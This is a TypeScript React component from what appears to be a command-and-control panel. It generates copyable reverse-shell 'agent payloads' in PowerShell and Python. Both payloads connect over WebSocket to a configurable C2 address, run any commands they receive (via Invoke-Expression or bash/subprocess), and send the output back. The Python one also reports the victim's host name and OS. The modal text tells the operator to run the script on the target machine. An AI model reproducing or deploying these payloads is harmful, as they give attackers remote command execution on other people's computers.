import React, { useState } from 'react';
import { XMarkIcon, ClipboardDocumentListIcon, CheckCircleIcon } from '../../../../icons';

const getPowershellPayload = (c2Url: string) => `
$client = New-Object System.Net.WebSockets.ClientWebSocket;
$uri = New-Object System.Uri("${c2Url}");
$client.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait();
while ($client.State -eq 'Open') {
    $buffer = New-Object byte[](8192);
    $result = $client.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None).Result;
    $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count);
    $output = try {
        Invoke-Expression $command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    };
    $response = [System.Text.Encoding]::UTF8.GetBytes($output);
    $client.SendAsync($response, 'Text', $true, [System.Threading.CancellationToken]::None).Wait();
}
`.trim();

const getPythonPayload = (c2Url: string) => `
import asyncio
import websockets
import subprocess
import platform

async def reverse_shell():
    uri = "${c2Url}"
    async with websockets.connect(uri) as websocket:
        await websocket.send(f"Agent connected: {platform.node()} on {platform.system()}")
        while True:
            command = await websocket.recv()
            if command.lower() == 'exit':
                break
            try:
                if platform.system() == "Windows":
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                else:
                    proc = subprocess.Popen(['/bin/bash', '-c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                
                stdout, stderr = proc.communicate()
                output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                await websocket.send(output or "Command executed with no output.")
            except Exception as e:
                await websocket.send(str(e))

asyncio.run(reverse_shell())
`.trim();

const CodeBlock: React.FC<{ language: string, code: string }> = ({ language, code }) => {
    const [copied, setCopied] = useState(false);

    const handleCopy = () => {
        navigator.clipboard.writeText(code);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    return (
        <div>
            <div className="flex justify-between items-center bg-gyn-bg-primary-dark px-4 py-2 rounded-t-md">
                <span className="text-sm font-semibold text-gyn-text-primary-dark">{language}</span>
                <button onClick={handleCopy} className="flex items-center gap-2 text-xs text-gyn-text-primary-dark hover:text-gyn-accent-dark">
                    {copied ? <CheckCircleIcon className="w-4 h-4 text-green-500" /> : <ClipboardDocumentListIcon className="w-4 h-4" />}
                    {copied ? 'Copied!' : 'Copy'}
                </button>
            </div>
            <pre className="bg-gyn-bg-secondary-dark p-4 rounded-b-md text-xs overflow-x-auto">
                <code>{code}</code>
            </pre>
        </div>
    );
};


interface PayloadGeneratorModalProps {
    c2Url: string;
    onClose: () => void;
}

const PayloadGeneratorModal: React.FC<PayloadGeneratorModalProps> = ({ c2Url, onClose }) => {
    const [activeTab, setActiveTab] = useState<'powershell' | 'python'>('powershell');

    const powershellPayload = getPowershellPayload(c2Url);
    const pythonPayload = getPythonPayload(c2Url);

    return (
        <div
            className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4"
            onClick={onClose}
            role="dialog"
            aria-modal="true"
        >
            <div
                className="bg-gyn-bg-tertiary-dark w-full max-w-2xl rounded-lg shadow-2xl flex flex-col animate-scaleIn border border-gyn-border-primary-dark"
                onClick={e => e.stopPropagation()}
            >
                <header className="flex items-center justify-between p-4 border-b border-gyn-border-primary-dark shrink-0">
                    <h2 className="text-lg font-bold text-gyn-text-secondary-dark">Generate Agent Payload</h2>
                    <button onClick={onClose} className="p-1 rounded-full hover:bg-gyn-bg-secondary-dark">
                        <XMarkIcon className="w-6 h-6 text-gyn-text-primary-dark" />
                    </button>
                </header>
                <div className="p-4 text-gyn-text-primary-dark">
                    <p className="text-sm mb-4">Select a payload type below. Execute the generated script on the target machine to establish a reverse shell connection back to this C2 panel.</p>
                    
                    <div className="flex border-b border-gyn-border-primary-dark mb-4">
                        <button 
                            onClick={() => setActiveTab('powershell')}
                            className={`px-4 py-2 text-sm font-semibold ${activeTab === 'powershell' ? 'border-b-2 border-gyn-accent-dark text-gyn-accent-dark' : 'text-gyn-text-primary-dark'}`}
                        >
                            PowerShell (Windows)
                        </button>
                        <button 
                             onClick={() => setActiveTab('python')}
                             className={`px-4 py-2 text-sm font-semibold ${activeTab === 'python' ? 'border-b-2 border-gyn-accent-dark text-gyn-accent-dark' : 'text-gyn-text-primary-dark'}`}
                        >
                            Python (Cross-platform)
                        </button>
                    </div>

                    {activeTab === 'powershell' && (
                        <CodeBlock language="PowerShell" code={powershellPayload} />
                    )}

                    {activeTab === 'python' && (
                        <CodeBlock language="Python" code={pythonPayload} />
                    )}
                </div>
            </div>
        </div>
    );
};

export default PayloadGeneratorModal;